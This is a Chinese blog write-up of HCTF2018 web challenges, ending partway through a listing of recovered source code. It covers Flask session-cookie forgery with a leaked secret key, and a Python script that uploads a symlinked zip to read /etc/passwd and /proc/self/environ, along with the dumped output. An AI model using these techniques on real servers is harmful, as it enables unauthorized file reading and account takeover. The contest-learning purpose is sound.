<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>HCTF2018 WriteUp - rmb122's notebook</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
和师傅们肝了两天, 最后排名 25, 看看一堆没做出来的题, 感到自己深深的菜&mldr;"><meta property="og:image" content><meta property="og:title" content="HCTF2018 WriteUp"><meta property="og:description" content="
和师傅们肝了两天, 最后排名 25, 看看一堆没做出来的题, 感到自己深深的菜&mldr;"><meta property="og:type" content="article"><meta property="og:url" content="https://rmb122.com/2018/11/12/hctf2018-writeup/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2018-11-12T00:18:29+00:00"><meta property="article:modified_time" content="2018-11-12T00:18:29+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="HCTF2018 WriteUp"><meta name=twitter:description content="
和师傅们肝了两天, 最后排名 25, 看看一堆没做出来的题, 感到自己深深的菜&mldr;"><script src=https://rmb122.com/js/feather.min.js></script>
<link rel=stylesheet type=text/css media=screen href=https://rmb122.com/css/main.156ea4f9c8c3d7072fb0ea9460063a78eceb89a501e4444cfab3783b79985a3a.css><link id=darkModeStyle rel=stylesheet type=text/css href=https://rmb122.com/css/dark.4d342f24ad49bb75f14c3b92c9454fe693d293fb7474ecc40a101a8ad6af9d71.css disabled></head><body><div class=content><header><div class=main><a href=https://rmb122.com/>rmb122's notebook</a></div><nav><a href=/>首页</a>&nbsp;
<a href=/posts>归档</a>&nbsp;
<a href=/tags>标签</a>&nbsp;
<a href=/links>友链</a>&nbsp;
<a href=/about>关于</a>
| <a id=dark-mode-toggle onclick=toggleTheme() href></a>
<script src=https://rmb122.com/js/themetoggle.js></script></nav></header><main><article><div class=title><h1 class=title>HCTF2018 WriteUp</h1><div class=meta>发表于 2018 年 11 月 12 日</div></div><section class=body><p><img src=https://i.loli.net/2019/03/08/5c82768fe4d67.jpg#center alt referrerpolicy=no-referrer><br>和师傅们肝了两天, 最后排名 25, 看看一堆没做出来的题, 感到自己深深的菜&mldr;</p><h2 id=0x01admin>0x01 admin</h2><p>在改密码的地方有 hint, 
<img src=https://i.loli.net/2019/03/08/5c8276960e9a1.jpg#center alt referrerpolicy=no-referrer></p><p>得到源码后第一个发现的是可能存在条件竞争, 题目里面是先将 <code>session</code> 里面的 <code>name</code> 给改了再去验证密码的</p><p><img src=https://i.loli.net/2019/03/08/5c82769adc533.jpg#center alt referrerpolicy=no-referrer></p><p>但之后发现 <code>flask</code> 不是像 <code>php</code> 一样将 <code>session</code> 保存在服务端, 而是保存在 <code>cookies</code> 里面的, 所以这里其实是不存在条件竞争的. 最后发现其实 <code>SECRET_KEY</code> 已经给我们了, 完全可以伪造 <code>session</code>.</p><p><img src=https://i.loli.net/2019/03/08/5c82769e190bc.jpg#center alt referrerpolicy=no-referrer></p><p>这里估计是怕太明显, <code>environ</code> 里面是没 <code>SECRET_KEY</code> 的 (看了其他的 WriteUp 其实就是出题人环境没配好 233), 所以直接用 <code>cjk123</code> 就可以了. 在 <a href=https://github.com/noraj/flask-session-cookie-manager/stargazers title rel="noopener nofollow noreferrer" target=_blank>github</a> 上可以找到用 <code>SECRET_KEY</code> 来生成 <code>session</code> 的小工具, 先解码看看结构后改一下 <code>name</code> 就可以了. 最后把现在的换成生成的 <code>session</code> 访问 <code>index</code> 就可以 get flag 了, 不过这 flag&mldr; 是我们非预期解还是这个题目是中间没做完强行改了一下放出来的 0.0</p><p><img src=https://i.loli.net/2019/03/08/5c8276a0c91d9.jpg#center alt referrerpolicy=no-referrer></p><h2 id=0x02hide-and-seek>0x02 hide and seek</h2><p>通过 <code>cookie</code> 可以看出来跟上一题一样是 <code>flask</code>, 题目这么强调 <code>zipfile</code>, 所以肯定跟这个有关, 在谷歌上搜到一个通过在里面加 <code>../../../file</code> 的文件来导致目录穿越的, 但是试了下并没有用. 最后还是师傅想到用软链试试, 结果正是如此, 可以通过软链来任意文件读取, 但比较麻烦的是不像 <code>php</code>, 直接在 <code>URL</code> 上就给你文件名, 我们得想办法把文件名给找到读出源码才能下一步. 这里写个 <code>python</code> 脚本来简化我们的工作</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff79c6>import</span> zipfile
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#ff79c6>import</span> requests
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>z_info <span style=color:#ff79c6>=</span> zipfile<span style=color:#ff79c6>.</span>ZipInfo(<span style=color:#f1fa8c>&#34;symlink&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>z_info<span style=color:#ff79c6>.</span>external_attr <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>2717843456</span> <span style=color:#6272a4># Magic Number. Meaning this is a symlink.</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>z_file <span style=color:#ff79c6>=</span> zipfile<span style=color:#ff79c6>.</span>ZipFile(<span style=color:#f1fa8c>&#34;test.zip&#34;</span>, mode<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;w&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>z_file<span style=color:#ff79c6>.</span>writestr(z_info, <span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;/etc/passwd&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>z_file<span style=color:#ff79c6>.</span>close()
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>cookie <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>open</span>(<span style=color:#f1fa8c>&#34;pysession&#34;</span>)<span style=color:#ff79c6>.</span>read()
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>sess <span style=color:#ff79c6>=</span> requests<span style=color:#ff79c6>.</span>session()
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>sess<span style=color:#ff79c6>.</span>cookies[<span style=color:#f1fa8c>&#34;session&#34;</span>] <span style=color:#ff79c6>=</span> cookie
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>files <span style=color:#ff79c6>=</span> {
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>    <span style=color:#f1fa8c>&#34;the_file&#34;</span> : (<span style=color:#f1fa8c>&#34;test.zip&#34;</span>, <span style=color:#8be9fd;font-style:italic>open</span>(<span style=color:#f1fa8c>&#34;test.zip&#34;</span>, <span style=color:#f1fa8c>&#34;rb&#34;</span>), <span style=color:#f1fa8c>&#34;application/zip&#34;</span>),
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>res <span style=color:#ff79c6>=</span> sess<span style=color:#ff79c6>.</span>post(<span style=color:#f1fa8c>&#34;http://hideandseek.2018.hctf.io/upload&#34;</span>, files<span style=color:#ff79c6>=</span>files)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#ff79c6>if</span> res<span style=color:#ff79c6>.</span>text:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>    <span style=color:#8be9fd;font-style:italic>print</span>(res<span style=color:#ff79c6>.</span>text)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span><span style=color:#8be9fd;font-style:italic>open</span>(<span style=color:#f1fa8c>&#34;pysession&#34;</span>, <span style=color:#f1fa8c>&#34;w&#34;</span>)<span style=color:#ff79c6>.</span>write(sess<span style=color:#ff79c6>.</span>cookies[<span style=color:#f1fa8c>&#34;session&#34;</span>])
</span></span></code></pre></div><p>将 <code>/etc/passwd</code> 换成想读的文件就可以了, 需要提前将一个登陆过的 <code>session</code> 写在 <code>pysession</code> 里面. 然后在这里困了挺久, 读了一圈系统配置也没找到提示, 最后师傅想到可以爆破 <code>/proc/{pid}/environ</code> 来爆破自己这个进程的环境变量来得到 <code>UWSGI_INI</code> 位置 (后来知道其实 <code>/proc/self/environ</code> 就可以了 不用爆破), 我们得到的是</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>UWSGI_CHEAPER=2
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>LANG=C.UTF-8
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>HOSTNAME=309ee00b10f9
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>NJS_VERSION=1.13.12.0.2.0-1~stretch
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>UWSGI_PROCESSES=16
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>LISTEN_PORT=80
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>NGINX_VERSION=1.13.12-1~stretch
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>PWD=/app/hard_t0_guess_n9f5a95b5ku9fg
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>STATIC_URL=/
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>staticHOME=/root
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>NGINX_WORKER_PROCESSES=auto
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>STATIC_INDEX=0PYTHON_VERSION=3.6.6
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>SHLVL=0
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>PYTHONPATH=/app
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>NGINX_MAX_UPLOAD=0
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>UWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>STATIC_PATH=/app/static
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>PYTHON_PIP_VERSION=18.1
</span></span></code></pre></div><p><code>INI</code> 中有个 <code>module</code> 值, 就是 py 脚本的位置, 我们得到的值是 <code>hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main</code>, 可以想到文件路径就是 <code>/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py</code>, 得到</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#6272a4># -*- coding: utf-8 -*-</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#ff79c6>from</span> flask <span style=color:#ff79c6>import</span> Flask,session,render_template,redirect, url_for, escape, request,Response
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#ff79c6>import</span> uuid
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#ff79c6>import</span> base64
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#ff79c6>import</span> random
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#ff79c6>import</span> flag
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#ff79c6>from</span> werkzeug.utils <span style=color:#ff79c6>import</span> secure_filename
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#ff79c6>import</span> os
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>random<span style=color:#ff79c6>.</span>seed(uuid<span style=color:#ff79c6>.</span>getnode())
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>app <span style=color:#ff79c6>=</span> Flask(__name__)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>app<span style=color:#ff79c6>.</span>config[<span style=color:#f1fa8c>&#39;SECRET_KEY&#39;</span>] <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>str</span>(random<span style=color:#ff79c6>.</span>random()<span style=color:#ff79c6>*</span><span style=color:#bd93f9>100</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>app<span style=color:#ff79c6>.</span>config[<span style=color:#f1fa8c>&#39;UPLOAD_FOLDER&#39;</span>] <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;./uploads&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>app<span style=color:#ff79c6>.</span>config[<span style=color:#f1fa8c>&#39;MAX_CONTENT_LENGTH&#39;</span>] <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>100</span> <span style=color:#ff79c6>*</span> <span style=color:#bd93f9>1024</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>ALLOWED_EXTENSIONS <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>set</span>([<span style=color:#f1fa8c>&#39;zip&#39;</span>])
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>allowed_file</span>(filename):
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>    <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>&#39;.&#39;</span> <span style=color:#ff79c6>in</span> filename <span style=color:#ff79c6>and</span> filename<span style=color:#ff79c6>.</span>rsplit(<span style=color:#f1fa8c>&#39;.&#39;</span>, <span style=color:#bd93f9>1</span>)[<span style=color:#bd93f9>1</span>]<span style=color:#ff79c6>.</span>lower() <span style=color:#ff79c6>in</span> ALLOWED_EXTENSIONS
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>@app<span style=color:#ff79c6>.</span>route(<span style=color:#f1fa8c>&#39;/&#39;</span>, methods<span style=color:#ff79c6>=</span>[<span style=color:#f1fa8c>&#39;GET&#39;</span>])
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>index</span>():
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>    error <span style=color:#ff79c6>=</span> request<span style=color:#ff79c6>.</span>args<span style=color:#ff79c6>.</span>get(<span style=color:#f1fa8c>&#39;error&#39;</span>, <span style=color:#f1fa8c>&#39;&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>    <span style=color:#ff79c6>if</span>(error <span style=color:#ff79c6>==</span> <span style=color:#f1fa8c>&#39;1&#39;</span>):
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>        session<span style=color:#ff79c6>.</span>pop(<span style=color:#f1fa8c>&#39;username&#39;</span>, <span style=color:#ff79c6>None</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>        <span style=color:#ff79c6>return</span> render_template(<span style=color:#f1fa8c>&#39;index.html&#39;</span>, forbidden<span style=color:#ff79c6>=</span><span style=color:#bd93f9>1</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>    <span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>&#39;username&#39;</span> <span style=color:#ff79c6>in</span> session:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>        <span style=color:#ff79c6>return</span> render_template(<span style=color:#f1fa8c>&#39;index.html&#39;</span>, user<span style=color:#ff79c6>=</span>session[<span style=color:#f1fa8c>&#39;username&#39;</span>], flag<span style=color:#ff79c6>=</span>flag<span style=color:#ff79c6>.</span>flag)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>    <span style=color:#ff79c6>else</span>:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>        <span style=color:#ff79c6>return</span> render_template(<span style=color:#f1fa8c>&#39;index.html&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>@app<span style=color:#ff79c6>.</span>route(<span style=color:#f1fa8c>&#39;/login&#39;</span>, methods<span style=color:#ff79c6>=</span>[<span style=color:#f1fa8c>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>login</span>():
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span>    username<span style=color:#ff79c6>=</span>request<span style=color:#ff79c6>.</span>form[<span style=color:#f1fa8c>&#39;username&#39;</span>]
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span>    password<span style=color:#ff79c6>=</span>request<span style=color:#ff79c6>.</span>form[<span style=color:#f1fa8c>&#39;password&#39;</span>]
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span>    <span style=color:#ff79c6>if</span> request<span style=color:#ff79c6>.</span>method <span style=color:#ff79c6>==</span> <span style=color:#f1fa8c>&#39;POST&#39;</span> <span style=color:#ff79c6>and</span> username <span style=color:#ff79c6>!=</span> <span style=color:#f1fa8c>&#39;&#39;</span> <span style=color:#ff79c6>and</span> password <span style=color:#ff79c6>!=</span> <span style=color:#f1fa8c>&#39;&#39;</span>:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span>        <span style=color:#ff79c6>if</span>(username <span style=color:#ff79c6>==</span> <span style=color:#f1fa8c>&#39;admin&#39;</span>):
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span><span>            <span style=color:#ff79c6>return</span> redirect(url_for(<span style=color:#f1fa8c>&#39;index&#39;</span>,error<span style=color:#ff79c6>=</span><span style=color:#bd93f9>1</span>))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40</span><span>        session[<span style=color:#f1fa8c>&#39;username&#39;</span>] <span style=color:#ff79c6>=</span> username
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41</span><span>    <span style=color:#ff79c6>return</span> redirect(url_for(<span style=color:#f1fa8c>&#39;index&#39;</span>))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44</span><span>@app<span style=color:#ff79c6>.</span>route(<span style=color:#f1fa8c>&#39;/logout&#39;</span>, methods<span style=color:#ff79c6>=</span>[<span style=color:#f1fa8c>&#39;GET&#39;</span>])
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45</span><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>logout</span>():
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46</span><span>    session<span style=color:#ff79c6>.</span>pop(<span style=color:#f1fa8c>&#39;username&#39;</span>, <span style=color:#ff79c6>None</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47</span><span>    <span style=color:#ff79c6>return</span> redirect(url_for(<span style=color:#f1fa8c>&#39;index&#39;</span>))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49</span><span>@app<span style=color:#ff79c6>.</span>route(<span style=color:#f1fa8c>&#39;/upload&#39;</span>, methods<span style=color:#ff79c6>=</span>[<span style=color:#f1fa8c>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50</span><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>upload_file</span>():
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51</span><span>    <span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>&#39;the_file&#39;</span> <span style=color:#ff79c6>not</span> <span style=color:#ff79c6>in</span> request<span style=color:#ff79c6>.</span>files:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52</span><span>        <span style=color:#ff79c6>return</span> redirect(url_for(<span style=color:#f1fa8c>&#39;index&#39;</span>))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53</span><span>    file <span style=color:#ff79c6>=</span> request<span style=color:#ff79c6>.</span>files[<span style=color:#f1fa8c>&#39;the_file&#39;</span>]
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54</span><span>    <span style=color:#ff79c6>if</span> file<span style=color:#ff79c6>.</span>filename <span style=color:#ff79c6>==</span> <span style=color:#f1fa8c>&#39;&#39;</span>:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55</span><span>        <span style=color:#ff79c6>return</span> redirect(url_for(<span style=color:#f1fa8c>&#39;index&#39;</span>))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56</span><span>    <span style=color:#ff79c6>if</span> file <span style=color:#ff79c6>and</span> allowed_file(file<span style=color:#ff79c6>.</span>filename):
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57</span><span>        filename <span style=color:#ff79c6>=</span> secure_filename(file<span style=color:#ff79c6>.</span>filename)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58</span><span>        file_save_path <span style=color:#ff79c6>=</span> os<span style=color:#ff79c6>.</span>path<span style=color:#ff79c6>.</span>join(app<span style=color:#ff79c6>.</span>config[<span style=color:#f1fa8c>&#39;UPLOAD_FOLDER&#39;</span>], filename)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59</span><span>        <span style=color:#ff79c6>if</span>(os<span style=color:#ff79c6>.</span>path<span style=color:#ff79c6>.</span>exists(file_save_path)):
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60</span><span>            <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>&#39;This file already exists&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61</span><span>        file<span style=color:#ff79c6>.</span>save(file_save_path)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">62</span><span>    <span style=color:#ff79c6>else</span>:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">63</span><span>        <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>&#39;This file is not a zipfile&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">64</span><span>
